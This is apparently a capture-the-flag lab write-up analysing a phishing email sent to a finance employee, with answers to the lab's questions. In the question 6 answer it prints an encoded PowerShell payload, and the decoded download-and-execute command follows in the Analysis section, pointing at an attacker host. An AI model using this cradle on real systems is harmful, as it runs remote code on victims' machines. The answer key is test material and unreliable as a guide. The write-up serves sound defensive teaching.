# Task 2: Email Analysis

## Scenario: The Boogeyman is Here!

Julianne, a finance employee working for Quick Logistics LLC, received a follow-up email regarding an unpaid invoice from their business partner, B Packaging Inc. Unbeknownst to her, the attached document was malicious and compromised her workstation.

The security team was able to flag the suspicious execution of the attachment, in addition to the phishing reports received from other finance department employees. This indicates a highly targeted attack on the finance team. Upon checking the latest threat intelligence, the initial Tactics, Techniques, and Procedures (TTPs) used for the malicious attachment are attributed to a new threat group named **Boogeyman**, known specifically for targeting the logistics sector.

**Your task:** Analyze and assess the impact of this compromise, starting with the initial access vector.

---

## Investigation Guide: Analyzing `dump.eml`

Given the initial information, we know that the compromise started with a phishing email. Our first step is to analyze the `dump.eml` file, which is located in the `/home/ubuntu/Desktop/artefacts` directory within the provided VM.

There are two primary ways to analyze the email headers and rebuild the attached payload:

### Method 1: Manual Analysis (Command-Line Tools)

This method involves using basic command-line tools available in the VM to extract and decode information directly from the `.eml` file.

* **Tools:** `cat`, `grep`, `base64`, `sed`.
* **Process:** Manually analyze the contents of `dump.eml`. The encoded payload (often base64) is typically located at the bottom of the file. You will need to extract this string and decode it.

    ```bash
    # Sample command to rebuild the payload, presuming the encoded payload is written in another file, without all line terminators
    # Example: cat <PAYLOAD_FILE> | base64 -d > Invoice.zip
    ```

### Method 2: Using Thunderbird (GUI)

This is often the simpler and more intuitive method for initial email review.

* **Tool:** Thunderbird (pre-installed in the VM).
* **Process:** Double-click the `dump.eml` file to open it directly via Thunderbird. The email's content, headers, and attachments will be presented in a user-friendly interface. The attachment can then be easily saved and extracted.

### Extracting Payload Information with `LNKParse3`

Once the payload from the encrypted archive is extracted (which often results in a `.LNK` file), you will use the `lnkparse` tool to extract detailed information about it.

* **Tool:** `lnkparse`
* **Command Example:**

    ```bash
    ubuntu@tryhackme:~ $ lnkparse <LNK_FILE>
    ```

---

## Questions and Analysis

Please provide your findings and explanations for the following questions:

### 1. What is the email address used to send the phishing email?

The email address can be found by accessing the `dump.eml` file w/ Thunderbird, as shown in the image below.

![image](https://github.com/user-attachments/assets/4156f9e0-aeed-4c5c-b239-f065b6f4f2d1)


We see that the answer is: agriffin@bpakcaging.xyz

This image can also be used to answer questions 2 & 5.

---

### 2. What is the email address of the victim?

![image](https://github.com/user-attachments/assets/9de92cd0-24be-4a71-8f27-57a06b5658d9)

If we check the recipient of the email, we find that the answer is: julianne.westcott@hotmail.com

---

### 3. What is the name of the third-party mail relay service used by the attacker based on the `DKIM-Signature` and `List-Unsubscribe` headers?

To find this information with Thunderbird, we need to view the source and find the appropriate headers. 

![image](https://github.com/user-attachments/assets/c75c19f5-48f5-4af6-882a-b02593821be8)
![image](https://github.com/user-attachments/assets/37e95c79-4f18-4bb7-bd76-44128b6f502e)

Once we do so, we find that the third-party mail relay service is: elasticemail

---

### 4. What is the name of the file inside the encrypted attachment?

To find this information, I downloaded the encrypted attachment to the artefacts directory and used the password provided in `dump.eml` to extract the file. 

![image](https://github.com/user-attachments/assets/2788c98c-a595-43a0-8905-f2d7895dc68b)

Once finished, we see that the name of the file is: Invoice_20230103.lnk

---

### 5. What is the password of the encrypted attachment?

As previously mentioned, we can find this information in the `dump.eml` file using Thunderbird. 

The answer is: Invoice2023!

---

### 6. Based on the result of the `lnkparse` tool, what is the encoded payload found in the `Command Line Arguments` field?

To find this information, we need to open up the terminal. From there we type the command, lnkparse <file_lnk>, as shown in the image below.

![image](https://github.com/user-attachments/assets/8d25a237-a0a3-40c3-9a98-3da95f44edd7)

Once we execute the command, we can find the answer in the output, as shown in the image below.

![image](https://github.com/user-attachments/assets/36778e16-0495-4127-977a-1911b3338083)

The answer is: aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==

---

### Analysis

We find that the email contains an attachment that will execute an encoded payload in the command line.

When decoded, we find that the command is as follows: 

iex (new-object net.webclient).downloadstring('hxxp[://]files[.]bpakcaging[.]xyz/update') 

As a note, the link above has been defanged. This also applies for the links in the following analysis.


**Step-by-step Breakdown:**

1. iex - This powershell commandlet, short for Invoke-Expression, executes a specified string as a command and returns its results.

2. new-object net.webclient - Creates a new instance of the .NET class System.Net.WebClient. This object allows the script to download data from the internet.

3. .downloadstring('hxxp[://]files[.]bpakcaging[.]xyz/update') - Calls the DownloadString method of the WebClient object. This downloads the content at the specified URL (hxxp[://]files[.]bpakcaging[.]xyz/update) as a string. Whatever code is hosted at that URL is fetched as text.


**Putting it together:**

The command: Creates a web client, downloads code from the internet, and executes that code in memory.

Why This Is Dangerous: This is a classic technique used in malware and remote code execution. The code at the external URL could do anything: install software, steal data, create backdoors, etc. Since it’s dynamically downloading and executing code, it's hard to detect statically. Often used in PowerShell-based attacks or fileless malware.

---
